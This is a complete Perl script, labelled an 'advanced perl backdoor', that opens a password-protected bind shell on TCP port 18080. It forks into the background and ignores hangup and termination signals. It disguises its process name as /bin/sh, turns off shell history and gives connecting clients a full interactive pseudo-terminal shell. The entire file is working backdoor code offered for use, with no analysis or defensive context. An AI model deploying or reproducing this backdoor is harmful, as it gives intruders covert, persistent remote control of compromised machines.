#!/usr/bin/perl
#
# Advanced perl backdoor
#
use warnings;
use strict;
use IO::Socket;
use IO::Select;
use POSIX;

my $PORT        = 18080;
# perl -e '$pass="yourpassword"; print crypt($pass,substr($pass,2))."\n"'
my $PASSWORD    = '';
my $SHELL       = "/bin/sh";
my $HOME        = "/tmp";
my $PROC        = "/bin/sh";
my $PROMPT	= "P-> ";
my @STTY        = ('sane', 'echoe', 'echoctl', 'echoke', '-ixany');

$ENV{HOME}       = $HOME;
$ENV{PS1}        = '\u@\h:\w\$ ';
$ENV{PATH}       = '/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/ucb';
$ENV{HISTFILE}   = '/dev/null';
$ENV{USER}       = 'root';
$ENV{LOGNAME}    = 'root';
$ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';
$ENV{LS_COLORS}  = 'LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:';
$ENV{SHELL}      = $SHELL;
$ENV{TERM}       = 'xterm';

$0 = $PROC."\0";

$SIG{HUP}  = 'IGNORE';
$SIG{TERM} = 'IGNORE';
$SIG{CHLD} = sub { wait; };

my %IOCTLDEF;
$IOCTLDEF{TIOCSWINSZ} = 0x5414;
$IOCTLDEF{TIOCNOTTY}  = 0x5422;
$IOCTLDEF{TIOCSCTTY}  = 0x540E;

#
# BSD
#
safeload('sys/ttycom.ph', 1);
safeload('sys/ioctl.ph', 1);
safeload('asm/ioctls.ph', 1);

foreach my $IOCTL (keys(%IOCTLDEF)) {
    next if (defined(&{$IOCTL}));
    # 
    # linux
    #
    if (open(IOD, "< /usr/include/asm/ioctls.h")) {
	while(<IOD>) {
	    if (/^\#define\s+$IOCTL\s+(.*?)\n$/) {
	    eval "sub $IOCTL () {$1;}";
	    last;
	}
    }
    close(IOD);
    }
    eval "sub $IOCTL () { $IOCTLDEF{$IOCTL};}" unless (defined(&{$IOCTL}));
}

#
# NO DEFAULT PORT
#
$PORT = $ARGV[0] if ($ARGV[0]);

my $bind = IO::Socket::INET->new(Listen=>1, LocalPort=>$PORT, Proto=>"tcp") or die "$!";

defined(my $pid = fork)
    or die "$!";
exit if $pid;

my %CLIENT;
my $sel_serv  = IO::Select->new($bind);
my $sel_shell = IO::Select->new();

#
# MAIN LOOP
#
while (1) {
    select(undef,undef,undef, 0.3) if (scalar(keys(%CLIENT)) == 0);
    read_clients();
    read_shells();
}

sub read_clients {
    map { read_client($_) } ($sel_serv->can_read(0.01));
}

sub read_shells {
    map { read_shell($_) } ($sel_shell->can_read(0.01));
}


sub read_client {
    my $fh = shift;
    if ($fh eq $bind) {
	my $newcon = $bind->accept;
	$sel_serv->add($newcon);
	$CLIENT{$newcon}->{senha} = 0;
	$CLIENT{$newcon}->{sock} = $newcon;
	$fh->autoflush(1);
	do_client($newcon, '3', '5', '1');
	sleep(1);
	write_client($newcon, $PROMPT) if ($PROMPT);
    } else {
	my $msg;
	my $nread = sysread($fh, $msg, 1024);
	if ($nread == 0) {
	    close_client($fh);
	} else {
	    telnet_parse($fh, $msg);
	}
    }
}

sub telnet_parse {
    my ($cli, $msg) = @_;
    my $char = (split('', $msg))[0];
    if (ord($char) == 255) {
	chr_parse($cli, $msg);
    } else {
	if ($CLIENT{$cli}->{senha} == 0) {
	    $CLIENT{$cli}->{buf} .= $msg;
	    return() unless ($msg =~ /\r|\n/);
	    my $pass = $CLIENT{$cli}->{buf};
	    $CLIENT{$cli}->{buf} = '';
	    $pass =~ s/\n//g;
	    $pass =~ s/\0//g;
	    $pass =~ s/\r//g;
	    if (crypt($pass, $PASSWORD) ne $PASSWORD) {
		close_client($cli);
	    } else {
		$CLIENT{$cli}->{senha} = 1;
		write_client($cli, "\r\n\r");
		new_shell($cli);
	    }
	    return();
	}
	$msg =~ s/\r\n\0\0//g;
	$msg =~ s/\0//g;
	$msg =~ s/\r\n/\n/g;
	write_shell($cli, $msg);
    }
}

sub read_shell {
    my $shell = shift;
    my $cli;
    map { $cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{shell} eq $shell) } keys(%CLIENT);
    my $msg;
    my $nread = sysread($shell, $msg, 1024);
    unless (defined $nread) {
	close_client($cli);
    } else {
	write_client($cli, $msg);
    }
}

sub to_chr {
    my $chrs = '';
    map { $chrs .= chr($_) } (split(/ +/, shift));
    return($chrs);
}

sub do_client {
    my ($client, @codes) = @_;
    map { write_client($client, chr(255).chr(251).chr($_)) } @codes;
}

sub chr_parse {
    my ($client, $chrs) = @_;
    my $ords = '';
    map { $ords .= ord($_).' ' } (split(//, $chrs));
    my $msg = '';

    if ($ords =~ /255 250 31 (\d+) (\d+) (\d+) (\d+)/) {
	my $winsize = pack('C4', $4, $3, $2, $1);
	ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);# or die "$!";
    }
    
    foreach my $code (split("255 ", $ords)) {
	if ($code =~ /(\d+) (.*)$/) {
	    my $codes = $2;
	    if ($1 == 251) {
		$msg .= chr(255).chr(253);
		map { $msg .= chr($_) } (split(/ +/, $codes));
	    }
	}
    }
    write_client($client, $msg) if ($msg);
    return(1);
}


sub new_shell {
    my $cli = shift;
    POSIX::setpgid(0, 0);
    my ($tty, $pty);
    unless (($tty, $pty) = open_tty($cli)) {
	finish_client($cli, "ERROR: No more pty's avaliable\n");
	return(undef);
    }
    my $pid = fork();
    if (not defined($pid)) {
	finish_client($cli, "ERROR: fork()\n");
	return(undef);
    }
    unless($pid) {
	close($pty);
	local(*DEVTTY);
	if (open (DEVTTY, "/dev/tty")) {
	    ioctl(DEVTTY, &TIOCNOTTY, 0 );# or die "$!";
	    close(DEVTTY);
	}
	POSIX::setsid();
	ioctl($tty, &TIOCSCTTY, 0);# or die "$!";

	open (STDIN, "<&".fileno($tty)) or die "$!";
	open (STDOUT, ">&".fileno($tty)) or die "$!";
	open (STDERR, ">&".fileno($tty)) or die "$!";
	close($tty);
	sleep(1);
	foreach my $stty ("/bin/stty", "/usr/bin/stty") {
	    next unless (-x $stty);
	    map { system("$stty", $_) } @STTY;
	}

	chdir("$HOME");
	{ exec("$SHELL") };
	while (my $msg = <STDIN>) {
	    $msg =~ s/\n$//;
	    $msg =~ s/\r$//;
	    system("$msg 2>&1");
	}
	exit;
    }
    close($tty);
    select($pty); $|++;
    select(STDOUT);
    set_raw($pty);
    $CLIENT{$cli}->{shell} = $pty;
    $sel_shell->add($pty);
    return(1);
}


sub set_raw($) {
    my $self = shift;
    return 1 if not POSIX::isatty($self);
    my $ttyno = fileno($self);
    my $termios = new POSIX::Termios;
    unless ($termios) {
	return undef;
    }
    unless ($termios->getattr($ttyno)) {
	return undef;
    }
    $termios->setiflag(0);
    $termios->setoflag(0);
    $termios->setlflag(0);
    $termios->setcc(&POSIX::VMIN, 1);
    $termios->setcc(&POSIX::VTIME, 0);
    unless ($termios->setattr($ttyno, &POSIX::TCSANOW)) {
	return undef;
    }
    return 1;
}

sub open_tty {
    no strict;
    my $cli = shift;
    my ($PTY, $TTY) = (*{"pty.$cli"}, *{"tty.$cli"});
    for (my $i=0; $i<256; $i++) {
	my $pty = get_tty($i, "/dev/pty");
	next unless (open($PTY, "+> $pty"));
	my $tty = get_tty($i, "/dev/tty");
	unless(open($TTY, "+> $tty")) {
	    close($PTY);
	    next;
	}
	return($TTY, $PTY);
    }
    return();
}

sub get_tty {
    my ($num, $base) = @_;
    my @series = ('p' .. 'z', 'a' .. 'e');
    my @subs = ('0' .. '9', 'a' .. 'f');
    my $buf = $base;
    $buf .= @series[($num >> 4) & 0xF];
    $buf .= @subs[$num & 0xF];
    return($buf);
}

sub safeload {
    my ($module, $require, $arg) = @_;
    my $file = $module;
    $file =~ s/::/\//g;
    if ($require) {
        map { eval ("require \"$_/$file\";") if(-f "$_/$file"); } @INC;
    } else {
	$file .= ".pm" unless ($file =~ /(\.pm|\.ph)$/);
	return(eval("use $module $arg;")) if (grep { -f "$_/$file" } @INC);
    }
    return;
}

sub write_shell {
    my ($cli, $msg) = @_;
    my $shell = $CLIENT{$cli}->{shell};
    return(undef) unless($shell);
    foreach my $m (split_chars($msg, 20)) {
	read_shells();
	print $shell $m;
	read_shells();
    }
    return(1);
}

sub split_chars {
    no warnings;
    my ($msg, $nchars) = @_;
    my @splited;
    my @chrs = split ('', $msg);
    my $done = 0;
    while (1) {
	my $splited = join('', @chrs[$done .. ($done+$nchars-1)]);
	$done += $nchars;
	last if (length($splited) < 1);
	push(@splited, $splited);
    }
    return(@splited);
}

sub finish_client {
    my ($cli, $msg) = @_;
    write_client($cli, $msg);
    close_client($cli);
}
   
sub close_client {
    my $cli = shift;
    my $sock = $CLIENT{$cli}->{sock};

    $sel_serv->remove($sock);
    if ($CLIENT{$cli}->{shell}) {
	my $shell = $CLIENT{$cli}->{shell};
	$sel_shell->remove($shell);
	close($shell);
    }
    $sock->close() if($sock);
    delete($CLIENT{$cli});
}

sub write_client {
    my ($cli, $msg) = @_;
    my $sock = $CLIENT{$cli}->{sock};
    syswrite($sock, $msg, length($msg)) if ($sock);
}
